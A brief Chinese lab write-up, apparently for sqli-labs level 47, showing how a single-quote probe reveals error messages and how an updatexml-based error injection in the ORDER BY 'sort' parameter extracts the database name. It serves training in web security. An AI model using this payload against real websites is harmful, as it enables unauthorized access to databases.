# GET-Error based -String -ORDER BY CLAUSE  
TAG：GET型注入、可控的Order by
## 漏洞利用  
![less47_1](images\less47_1.png)  
  
输入```?sort=1'```获取报错信息，得知参数的包裹方式为单引号   
![less47_2](images\less47_2.png)  
此less和less46相似，都是对order by参数可控，存在注入可能  
简单修改less46的payload进行数据库名的获取  
Payload:```?sort=1' and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--+```